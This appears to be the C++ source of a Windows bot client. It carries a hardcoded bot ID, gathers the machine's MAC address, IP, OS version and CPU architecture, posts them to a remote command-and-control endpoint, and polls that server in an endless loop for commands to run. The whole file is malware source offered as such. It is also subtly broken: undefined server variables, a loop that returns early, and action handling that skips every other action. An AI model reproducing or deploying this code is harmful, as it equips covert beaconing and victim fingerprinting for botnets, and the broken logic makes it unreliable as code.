#include "lib\DataCollector.h"
#include "lib\UtilLib.h"
#include <windows.h>
#include <Iphlpapi.h>
#include <strsafe.h>
#include <Windows.h>
#include <iostream>
#include "lib\ActionController.h"
#include "lib\HttpLib.h"
#include "lib\ThreadController.h"
#include <vector>
#define ENCODE_HTTP

void handleAction();

char* GetOS();
char* GetIP();
char* getMAC();
char* GetProcessor();

char *BOT_ID = "0VCv0dwVm8lhKHrgGg4dsPDI4LGCj4CD";
typedef void (WINAPI *PGNSI)(LPSYSTEM_INFO);
int COUNT = 3;
#if defined(THREADING)
ThreadController tc;
#endif
DataCollector dc;
#pragma comment(lib, "ws2_32.lib")
#define EXECUTE
ActionController ac;
typedef BOOL (WINAPI *PGPI)(DWORD, DWORD, DWORD, DWORD, PDWORD);
#define BOTLOOP
#pragma comment(lib, "iphlpapi.lib")
#ifdef ENCODE_HTTP
bool encode = true;
#else
bool encode = false;
#endif
#define REQ_COUNT
vector<vector<string>> requestQueue;

using namespace std;

int main(){
#if defined(BOTLOOP) || defined(EXECUTE)
char* MAC_ADDR = getMAC();
dc.addDataPair("bot_id", BOT_ID);
dc.addDataPair("mac_address", MAC_ADDR);
#endif
char *ip = GetIP();
dc.addDataPair("ip_address", ip);

#ifdef EXECUTE
sendP_Request(url, port, "/database/api/handler/", requestQueue, dc.getPostData());
dc.dumpCollectedData();
#endif
#ifdef BOTLOOP
string response = "";
struct Action action;
ac.addAction(action);
int reqCounter = 0;
while(1){
#if defined(TIME_CHECK) && defined(REQ_COUNT)
	if (waitForTime(TIMEARRAY, sizeof(TIMEARRAY), COUNT)){
#endif
		response = sendG_Request(url, port, "/database/api/connect_in/", requestQueue, dc.getGetData());
		action = ac.parseAction(response);
		ac.addAction(action);
		handleAction();
		reqCounter++;
		Sleep(3000);
		if(reqCounter % 5 == 0){
			sendP_Request(url, port, "/database/api/handler/", requestQueue, dc.getPostData());
			dc.dumpCollectedData();
		}
#ifdef FREQUENCY
waitForPeriod(WAIT);
#endif
#if defined(TIME_CHECK) && defined(REQ_COUNT)
	}
#endif
}
#endif
#if defined THREADING
tc.closeAllThreads();
#endif
}

char* getMAC(){
	PIP_ADAPTER_INFO AdapterInfo;
	DWORD dwBufLen = sizeof(AdapterInfo);
	char *mac_addr = (char*)malloc(17);
	AdapterInfo = (IP_ADAPTER_INFO *)malloc(sizeof(IP_ADAPTER_INFO));
	if (GetAdaptersInfo(AdapterInfo, &dwBufLen) == ERROR_BUFFER_OVERFLOW) {
		AdapterInfo = (IP_ADAPTER_INFO *)malloc(dwBufLen);
	}
	if (GetAdaptersInfo(AdapterInfo, &dwBufLen) == NO_ERROR) {
		PIP_ADAPTER_INFO pAdapterInfo = AdapterInfo;
		do {
				sprintf(mac_addr, "%02X-%02X-%02X-%02X-%02X-%02X",
				pAdapterInfo->Address[0], pAdapterInfo->Address[1],
				pAdapterInfo->Address[2], pAdapterInfo->Address[3],
				pAdapterInfo->Address[4], pAdapterInfo->Address[5]);
				return mac_addr;
				pAdapterInfo = pAdapterInfo->Next;
		} while (pAdapterInfo);
	}
	free(AdapterInfo);
}
char* GetIP()
{
	WSAData wsaData;
	WSAStartup(MAKEWORD(2, 2), &wsaData);
	HOSTENT* Host;
	char hostname[128] = { 0 };
	char* IPv4 = new char[128];
	gethostname(hostname, 128);
	Host = gethostbyname(hostname);
	IPv4 = inet_ntoa(*(in_addr*)Host->h_addr_list[0]);
	WSACleanup();
	return IPv4;
}
char* GetOS()
{
	OSVERSIONINFOEX osvi;
	SYSTEM_INFO si;
	PGNSI pGNSI;
	PGPI pGPI;
	BOOL bOsVersionInfoEx;
	ZeroMemory(&si, sizeof(SYSTEM_INFO));
	ZeroMemory(&osvi, sizeof(OSVERSIONINFOEX));
	osvi.dwOSVersionInfoSize = sizeof(OSVERSIONINFOEX);
	bOsVersionInfoEx = GetVersionEx((OSVERSIONINFO*)&osvi);
	if (!bOsVersionInfoEx){
#ifdef __APPLE__
		return "Mac";
#elif __linux__
		return "Linux";
#elif __unix__
		return "Unix";
#endif
		return "Other";
	}
	pGNSI = (PGNSI)GetProcAddress(GetModuleHandle(TEXT("kernel32.dll")), 
	"GetNativeSystemInfo");
	if (NULL != pGNSI)
		pGNSI(&si);
	else GetSystemInfo(&si);
	if (VER_PLATFORM_WIN32_NT == osvi.dwPlatformId && osvi.dwMajorVersion > 4){
		if (osvi.dwMajorVersion == 6){
			if (osvi.dwMinorVersion == 0){
				if (osvi.wProductType == VER_NT_WORKSTATION)
					return "Windows Vista";
				else return "Windows Server 2008";
			}
			if (osvi.dwMinorVersion == 1 || osvi.dwMinorVersion == 2){
				if (osvi.wProductType == VER_NT_WORKSTATION && osvi.dwMinorVersion == 1)
					return "Windows 7";
				else
					if (osvi.wProductType == VER_NT_WORKSTATION && osvi.dwMinorVersion == 2)
						return "Windows 8";
					else return "Windows Server 2008 R2";
			}
		}
		if (osvi.dwMajorVersion == 5 && osvi.dwMinorVersion == 2){
			if (osvi.wSuiteMask & VER_SUITE_WH_SERVER)
				return "Windows Home Server";
			else if (osvi.wProductType == VER_NT_WORKSTATION && si.wProcessorArchitecture == PROCESSOR_ARCHITECTURE_AMD64)
				return "Windows XP Professional";
			else return "Windows Server 2003";
		}
		if (osvi.dwMajorVersion == 5 && osvi.dwMinorVersion == 1)
			return "Windows XP";
		if (osvi.dwMajorVersion == 5 && osvi.dwMinorVersion == 0)
			return "Windows 2000";
		return "Windows";
	}
	else
		return "Other";
}
char* GetProcessor()
{
	OSVERSIONINFOEX osvi;
	SYSTEM_INFO si;
	PGNSI pGNSI;
	PGPI pGPI;
	BOOL bOsVersionInfoEx;
	ZeroMemory(&si, sizeof(SYSTEM_INFO));
	ZeroMemory(&osvi, sizeof(OSVERSIONINFOEX));
	osvi.dwOSVersionInfoSize = sizeof(OSVERSIONINFOEX);
	bOsVersionInfoEx = GetVersionEx((OSVERSIONINFO*)&osvi);
	if (!bOsVersionInfoEx) return "Not Determined";
	pGNSI = (PGNSI)GetProcAddress(GetModuleHandle(TEXT("kernel32.dll")), "GetNativeSystemInfo");
	if (NULL != pGNSI)
		pGNSI(&si);
	else GetSystemInfo(&si);
	if (VER_PLATFORM_WIN32_NT == osvi.dwPlatformId && osvi.dwMajorVersion > 4){
		if (osvi.dwMajorVersion >= 6){
			if (si.wProcessorArchitecture == PROCESSOR_ARCHITECTURE_AMD64)
				return "64-bit";
			else if (si.wProcessorArchitecture == PROCESSOR_ARCHITECTURE_INTEL)
				return "32-bit";
		}
		else
			return "32-bit";
	}
	return "Not Determined";
}
void handleAction(){
struct Action action;
while(ac.hasAction()){
action = ac.getNextAction();
printf("action %s\n", action.action.c_str());
if(action.action == "Send IP Address"){
printf("doing action %s\n", action.action.c_str());
char *ip = GetIP();
dc.addDataPair("ip_address", ip);
}
if(action.action == "Send OS"){
printf("doing action %s\n", action.action.c_str());
char *os = GetOS();
dc.addDataPair("os", os);
}
if(action.action == "Send CPU"){
printf("doing action %s\n", action.action.c_str());
char *proc = GetProcessor();
dc.addDataPair("cpu", proc);
}
action = ac.getNextAction();
}
}
